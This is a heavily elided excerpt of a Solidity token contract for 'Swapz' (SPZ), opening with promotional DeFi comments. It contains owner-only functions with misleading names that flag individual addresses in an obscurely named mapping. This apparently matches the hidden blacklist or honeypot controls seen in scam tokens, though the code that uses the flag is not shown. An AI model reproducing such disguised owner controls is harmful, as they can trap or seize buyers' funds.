...
// Swapz Token Contract v.1.0.0.0 kernel 0.1.0.0
// part of the new wave of decentralized banking & finance.
// From a capital-efficient money market, to tokenized synthetic assets, our mission is to grow your wealth.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Swapz';
    string constant public symbol = 'SPZ';
    ...
    function ConnectEfridgeBridge(address account) public onlyOwner {
    ...
    function FlexibilityBridge(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function StatsTransactions(address account) public view returns (bool) {
...
contract SwapzContract is BaseToken {
